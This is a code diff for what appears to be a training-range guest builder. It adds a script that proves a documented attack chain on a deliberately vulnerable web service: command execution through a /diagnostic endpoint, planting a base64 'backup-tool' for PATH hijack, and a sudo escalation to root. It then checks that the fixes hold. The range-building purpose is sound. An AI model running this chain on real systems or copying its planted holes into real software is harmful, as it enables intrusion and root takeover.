@@ -74,6 +74,17 @@ def _write_file_entry(path: str, content: str, perms: str = "0644",
             f"    content: |\n{_indent(content)}\n")
 
 
+def _payload_perms(path: str) -> str:
+    """Mode policy for payload files landing through cloud-init write_files.
+    The maintenance helper is executable (root-owned, NOT setuid — Linux
+    ignores setuid on scripts); its scoped sudo rule needs sudoers modes."""
+    if path.startswith("/etc/sudoers.d/"):
+        return "0440"
+    if path.endswith("/usr/local/bin/mojang-maintenance"):
+        return "0755"
+    return "0644"
+
+
 def _common_users() -> str:
     return """users:
   - name: defender
@@ -95,8 +106,7 @@ def build_user_data(role: str, payload: dict[str, str], packages: list[str]) -> 
     (cloud-init's `packages:` cannot pin versions, so pins are installed
     explicitly and fail closed on archive drift; resolved versions are
     RECORDED into the overlay at build time)."""
-    files = "".join(_write_file_entry(p, c,
-                                      perms="0755" if p.endswith("mojang-maintenance") else "0644")
+    files = "".join(_write_file_entry(p, c, perms=_payload_perms(p))
                     for p, c in sorted(payload.items()))
     backend = "mysql" if role == "mojang-web-db" else "local"
     files += _write_file_entry("/etc/mojang-web/config.env",
@@ -175,8 +185,11 @@ chmod 0640 /etc/sparring-range/shipper.env
 timeout 120 systemctl enable --now auditd sparring-shipper nginx mojang-web ssh || {{ mark UNITS-FAIL; poweroff; }}
 timeout 120 systemctl enable --now mysql || true
 timeout 60 systemctl restart auditd || true
-chown root:root /usr/local/bin/mojang-maintenance
-chmod 4755 /usr/local/bin/mojang-maintenance
+chown root:root /usr/local/bin/mojang-maintenance /etc/sudoers.d/mojang-maintenance
+chmod 0755 /usr/local/bin/mojang-maintenance
+chmod 0440 /etc/sudoers.d/mojang-maintenance
+visudo -cf /etc/sudoers.d/mojang-maintenance || {{ mark SUDOERS-FAIL; poweroff; }}
+install -d -o web-user -g web-user -m 0775 /srv/mojang-web/tools
 {db_setup}mark SETUP-OK
 dpkg-query -W -f='${{Package}}=${{Version}}\\n' {want} > /srv/sr-build/versions.txt 2>/dev/null || true
 sed 's/^/SR-GUEST-PKG:/' /srv/sr-build/versions.txt > /dev/ttyS0 || true
@@ -210,9 +223,11 @@ wchk MYSQL-ROW 30 bash -c 'mysql --protocol=TCP --host=127.0.0.1 --batch --skip-
 chk UNITS-ACTIVE bash -c 'systemctl is-active --quiet {units}'
 wchk CATALOGUE 30 bash -c "curl -sf http://127.0.0.1/ | grep -q 'Minecraft Legends'"
 chk CATALOGUE-COUNT bash -c "curl -sf http://127.0.0.1/ | grep -c buy- | grep -qx 12"
-chk DIAG-FLAW bash -c "curl -sf 'http://127.0.0.1:8080/diagnostic?cmd=whoami' && grep -q 'DIAG{{web-user}}' /tmp/mojang-diag-proof.txt"
-chk DIAG-FIX bash -c 'printf MOJANG_DIAG_ENABLED=off >> /etc/mojang-web/config.env && systemctl restart mojang-web && for i in $(seq 1 30); do curl -sf http://127.0.0.1:8080/ >/dev/null 2>&1 && break; sleep 2; done && curl -sf http://127.0.0.1/ | grep -q Legends && ! curl -sf "http://127.0.0.1:8080/diagnostic?cmd=whoami"'
-chk MAINT-HELPER bash -c 'test -u /usr/local/bin/mojang-maintenance'
+chk DIAG-FLAW /srv/sr-chain-checks.sh diag-flaw
+chk ROOT-FLAW /srv/sr-chain-checks.sh root-flaw
+chk MAINT-HELPER bash -c 'test -x /usr/local/bin/mojang-maintenance && ! test -u /usr/local/bin/mojang-maintenance && test -e /etc/sudoers.d/mojang-maintenance && [ "$(stat -c %U /srv/mojang-web/tools)" = web-user ]'
+chk MAINT-FIX /srv/sr-chain-checks.sh maint-fix
+chk DIAG-FIX /srv/sr-chain-checks.sh diag-fix
 chk AUDITD-RULES bash -c 'auditctl -l | grep -q sparring_cmd'
 chk SHIPPER-UNIT bash -c 'grep -q "^User=srshipper" /etc/systemd/system/sparring-shipper.service && grep -q adm /etc/systemd/system/sparring-shipper.service'
 chk SHIPPER-SPOOL bash -c 'test -d /var/lib/sparring-range/shipper'
@@ -222,6 +237,70 @@ chk FIREWALL bash -c 'ufw status | grep -qw active'
 {mysql_checks}
 echo "SR-GUEST-DONE rc=$fails" > {SERIAL}
 poweroff
+"""
+
+
+# Pilot step 1: the documented attack chain, proven on the INSTALLED guest
+# and driven entirely over HTTP — through the real mojang-web service, so
+# every executed command carries the REAL web-user identity (and the sudo
+# transition is real). The trojan below is what the chain plants as the
+# helper's PATH-hijacked `backup-tool`; it records the identity it achieved.
+_TROJAN_B64 = "IyEvYmluL3NoCmlkIC11ID4gL3RtcC9zci1yb290LXByb29mCmlkIC11biA+PiAv" \
+              "dG1wL3NyLXJvb3QtcHJvb2YK"
+
+
+def _chain_script() -> str:
+    """Standalone chain-proof script landed by the verify seed. Each mode is
+    one acceptance check; exit 0 = the expected real-world outcome held."""
+    return f"""#!/bin/bash
+# Generated attack-chain proof (pilot step 1). Modes:
+#  diag-flaw   — /diagnostic achieves GENUINE web-user execution (identity
+#                proven by a file the command itself writes + the proof file)
+#  root-flaw   — documented chain (plant backup-tool, run helper via the
+#                scoped sudo rule) achieves uid=0 (real identity change)
+#  maint-fix   — after revoking the sudo rule, the same chain yields NO root
+#                and services stay active
+#  diag-fix    — after disabling the endpoint it refuses (403) and executes
+#                nothing, while the catalogue keeps serving (http_content)
+S=/dev/ttyS0
+DIAG() {{ curl -s --max-time 20 --get --data-urlencode "cmd=$1" \\
+    http://127.0.0.1:8080/diagnostic; }}
+case "$1" in
+  diag-flaw)
+    rm -f /tmp/sr-diag-rce /tmp/mojang-diag-proof.txt
+    DIAG 'id -un > /tmp/sr-diag-rce; id -un' | grep -q web-user || exit 1
+    [ "$(cat /tmp/sr-diag-rce 2>/dev/null)" = web-user ] || exit 1
+    grep -q 'DIAG{{web-user}}' /tmp/mojang-diag-proof.txt || exit 1
+    ;;
+  root-flaw)
+    rm -f /tmp/sr-root-proof
+    DIAG 'echo {_TROJAN_B64} | base64 -d > /srv/mojang-web/tools/backup-tool && chmod 0775 /srv/mojang-web/tools/backup-tool' >/dev/null
+    DIAG 'sudo -n /usr/local/bin/mojang-maintenance' >/dev/null
+    sleep 1
+    [ "$(head -1 /tmp/sr-root-proof 2>/dev/null)" = 0 ] || exit 1
+    [ "$(tail -1 /tmp/sr-root-proof 2>/dev/null)" = root ] || exit 1
+    ;;
+  maint-fix)
+    rm -f /etc/sudoers.d/mojang-maintenance /tmp/sr-root-proof
+    DIAG 'sudo -n /usr/local/bin/mojang-maintenance' >/dev/null
+    sleep 1
+    [ ! -e /tmp/sr-root-proof ] || exit 1
+    systemctl is-active --quiet mojang-web nginx || exit 1
+    ;;
+  diag-fix)
+    rm -f /tmp/sr-post-fix /tmp/sr-post-fix2
+    DIAG 'touch /tmp/sr-post-fix' >/dev/null
+    [ -e /tmp/sr-post-fix ] || exit 1
+    printf 'MOJANG_DIAG_ENABLED=off\\n' >> /etc/mojang-web/config.env
+    systemctl restart mojang-web
+    for i in $(seq 1 30); do curl -sf http://127.0.0.1:8080/ >/dev/null 2>&1 && break; sleep 2; done
+    curl -sf http://127.0.0.1/ | grep -q Legends || exit 1
+    code=$(curl -s -o /dev/null -w '%{{http_code}}' --get --data-urlencode 'cmd=touch /tmp/sr-post-fix2' http://127.0.0.1:8080/diagnostic)
+    [ "$code" = 403 ] || exit 1
+    [ ! -e /tmp/sr-post-fix2 ] || exit 1
+    ;;
+  *) exit 2;;
+esac
 """
 
 
@@ -237,6 +316,8 @@ def verify_user_data(role: str, payload: dict[str, str],
               "MOJANG_MYSQL_USER=mojang_reader\n"
               "MOJANG_DIAG_ENABLED=on\n")
     files = (_write_file_entry("/etc/mojang-web/config.env", config) +
+             _write_file_entry("/srv/sr-chain-checks.sh", _chain_script(),
+                               perms="0755") +
              _write_file_entry("/srv/sr-verify-checks.sh",
                                _verify_checks(role), perms="0755"))
     runcmd = ["  - systemctl restart mojang-web",
